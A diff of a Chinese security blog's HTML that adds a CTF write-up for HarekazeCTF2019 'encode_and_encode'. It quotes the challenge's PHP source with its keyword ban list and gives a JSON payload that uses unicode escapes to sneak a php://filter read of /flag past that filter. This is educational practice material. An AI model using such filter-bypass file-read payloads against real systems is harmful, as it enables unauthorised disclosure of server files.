@@ -6,17 +6,22 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>P1nk Blog</title>
+  <title>HarekazeCTF2019 encode_and_encode | P1nk Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="p1nk blog">
-<meta property="og:type" content="website">
-<meta property="og:title" content="P1nk Blog">
-<meta property="og:url" content="http://example.com/index.html">
+  <meta name="description" content="​    知识点  php:&#x2F;&#x2F;input协议 php:&#x2F;&#x2F;filter协议 json字符串转义">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HarekazeCTF2019 encode_and_encode">
+<meta property="og:url" content="http://example.com/2022/03/20/HarekazeCTF2019-encode-and-encode/index.html">
 <meta property="og:site_name" content="P1nk Blog">
-<meta property="og:description" content="p1nk blog">
+<meta property="og:description" content="​    知识点  php:&#x2F;&#x2F;input协议 php:&#x2F;&#x2F;filter协议 json字符串转义">
 <meta property="og:locale">
+<meta property="og:image" content="http://example.com/2022/03/20/HarekazeCTF2019-encode-and-encode/image-20220320155328069.png">
+<meta property="article:published_time" content="2022-03-20T07:33:20.000Z">
+<meta property="article:modified_time" content="2022-03-20T07:56:04.772Z">
 <meta property="article:author" content="p1nk">
+<meta property="article:tag" content="buuctf">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/03/20/HarekazeCTF2019-encode-and-encode/image-20220320155328069.png">
   
     <link rel="alternative" href="/atom.xml" title="P1nk Blog" type="application/atom+xml">
   
@@ -158,16 +163,14 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-HarekazeCTF2019-encode-and-encode" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-HarekazeCTF2019-encode-and-encode" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/20/HarekazeCTF2019-encode-and-encode/">HarekazeCTF2019 encode_and_encode</a>
+    <h1 class="article-title" itemprop="name">
+      HarekazeCTF2019 encode_and_encode
     </h1>
   
 
@@ -186,11 +189,43 @@
 <li>php:&#x2F;&#x2F;filter协议</li>
 <li>json字符串转义</li>
 </ul>
-        
-          <a class="article-more-a" href="/2022/03/20/HarekazeCTF2019-encode-and-encode/#more">more >></a>
-        
+<span id="more"></span>
+
+<p>打开靶机，点击<code>Source Code</code>选项，可以看到源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//该函数主要用来过滤一些协议</span></span><br><span class="line">  <span class="variable">$banword</span> = [</span><br><span class="line">    <span class="comment">// no path traversal</span></span><br><span class="line">    <span class="string">&#x27;\.\.&#x27;</span>,</span><br><span class="line">    <span class="comment">// no stream wrapper</span></span><br><span class="line">    <span class="string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,</span><br><span class="line">    <span class="comment">// no data exfiltration</span></span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">  ];</span><br><span class="line">  <span class="variable">$regexp</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$banword</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$regexp</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$body</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);<span class="comment">//通过php://input协议获取post的参数</span></span><br><span class="line"><span class="variable">$json</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$body</span>, <span class="literal">true</span>);<span class="comment">//json解码为字符串</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_valid</span>(<span class="variable">$body</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$json</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$json</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$page</span> = <span class="variable">$json</span>[<span class="string">&#x27;page&#x27;</span>];<span class="comment">//获取page的参数</span></span><br><span class="line">  <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$page</span>);<span class="comment">//将page读入一个字符串</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$content</span> || !<span class="title function_ invoke__">is_valid</span>(<span class="variable">$content</span>)) &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable">$content</span> = <span class="string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;</span>, <span class="string">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;content&#x27;</span> =&gt; <span class="variable">$content</span>]); </span><br></pre></td></tr></table></figure>
+
+<p>通过源码可以知道，这里过滤了很多协议，但是可以发现源码里存在json解。由此可以作为一个突破口，虽然这里过滤了php关键字，但是在json里面，<code>\u0061</code>相当于<code>a</code>。</p>
+<p>即将php关键字通过unicode的utf-16编码，从而绕过is_valid()函数，在json解码的时候，这些编码的字符串又会被解码为php，被过滤的flag也同理可以绕过。</p>
+<p><strong>payload</strong></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;page&quot;</span><span class="punctuation">:</span><span class="string">&quot;\u0070\u0068\u0070://filter/read=convert.base64-encode/resource=/\u0066\u006C\u0061\u0067&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>抓包，添加数据</p>
+<p><img src="/2022/03/20/HarekazeCTF2019-encode-and-encode/image-20220320155328069.png" alt="image-20220320155328069"></p>
+<p>将得到的数据base64解码，即可得到flag</p>
+
       
 
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
       
     </div>
     <div class="article-info article-info-index">
@@ -210,16 +245,75 @@
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/03/20/HarekazeCTF2019-encode-and-encode/">展开全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2022/03/20/HarekazeCTF2019-encode-and-encode/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2022/03/19/WUSTCTF2020-CV-Maker/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">WUSTCTF2020 CV Maker</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -239,411 +333,14 @@
 
 
 
-
   
-    <article id="post-WUSTCTF2020-CV-Maker" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/19/WUSTCTF2020-CV-Maker/">WUSTCTF2020 CV Maker</a>
-    </h1>
   
 
-        
-        <a href="/2022/03/19/WUSTCTF2020-CV-Maker/" class="archive-article-date">
-  	<time datetime="2022-03-19T07:27:23.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-19</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>​    <strong>知识点：</strong></p>
-<ul>
-<li>文件上传</li>
-</ul>
-<p>题目</p>
-<p>进去之后发现可以注册和登录，一开始以为是sql注入的题目，不过测试了半天并没有发现注入点。只能先注册，登录成功之后，发现可以上传图像。</p>
-        
-          <a class="article-more-a" href="/2022/03/19/WUSTCTF2020-CV-Maker/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">buuctf</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/03/19/WUSTCTF2020-CV-Maker/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-SWPUCTF-2018-SimplePHP" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/18/SWPUCTF-2018-SimplePHP/">SWPUCTF 2018 SimplePHP</a>
-    </h1>
   
 
-        
-        <a href="/2022/03/18/SWPUCTF-2018-SimplePHP/" class="archive-article-date">
-  	<time datetime="2022-03-18T05:44:10.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-18</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><strong>知识点</strong></p>
-<ul>
-<li>pop链构造</li>
-<li>phar文件上传</li>
-</ul>
-        
-          <a class="article-more-a" href="/2022/03/18/SWPUCTF-2018-SimplePHP/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">buuctf</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/03/18/SWPUCTF-2018-SimplePHP/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-watevrCTF-2019-Cookie-Store" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/14/watevrCTF-2019-Cookie-Store/">watevrCTF-2019 Cookie Store</a>
-    </h1>
   
 
-        
-        <a href="/2022/03/14/watevrCTF-2019-Cookie-Store/" class="archive-article-date">
-  	<time datetime="2022-03-14T12:10:11.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-14</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>  这是一道简单的题目，打开靶机，可以看到里面有商品售卖。所以先抓个包看看</p>
-        
-          <a class="article-more-a" href="/2022/03/14/watevrCTF-2019-Cookie-Store/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">buuctf</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/03/14/watevrCTF-2019-Cookie-Store/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-网鼎杯-2020-白虎组PicDown" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/13/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84PicDown/">网鼎杯 2020 白虎组PicDown</a>
-    </h1>
-  
-
-        
-        <a href="/2022/03/13/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84PicDown/" class="archive-article-date">
-  	<time datetime="2022-03-13T08:52:01.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-13</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><strong>知识点</strong></p>
-<ul>
-<li>任意文件读取漏洞</li>
-<li>linux文件描述符</li>
-<li>python反弹shell</li>
-</ul>
-<p>打开靶机，随便输入个1，可以看见在&#x2F;page页面下有个get方式的url参数，抓包进行测试。在url输入一个网址可以获得一个图片文件，改名打开文件，可以发现是源码。于是我想着这里是否可以使用<code>?url=php://filter</code>获取源码，结果不行。</p>
-        
-          <a class="article-more-a" href="/2022/03/13/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84PicDown/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">buuctf</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/03/13/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84PicDown/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-GYCTF2020-Ezsqli" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/12/GYCTF2020-Ezsqli/">GYCTF2020-Ezsqli</a>
-    </h1>
-  
-
-        
-        <a href="/2022/03/12/GYCTF2020-Ezsqli/" class="archive-article-date">
-  	<time datetime="2022-03-12T02:58:56.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><strong>知识点</strong></p>
-<ul>
-<li>布尔盲注</li>
-<li>无列名注入</li>
-</ul>
-<p>1.抓包，测试发现</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1时显示Nu1L</span><br><span class="line">id=0时显示Error Occured When Fetch Result.</span><br><span class="line">id=&#x27;时显示bool(false)</span><br></pre></td></tr></table></figure>
-
-<p>由此推断这里存在数字型的bool注入，构造测试语句</p>
-        
-          <a class="article-more-a" href="/2022/03/12/GYCTF2020-Ezsqli/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">buuctf</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/03/12/GYCTF2020-Ezsqli/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
 
 
@@ -671,8 +368,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
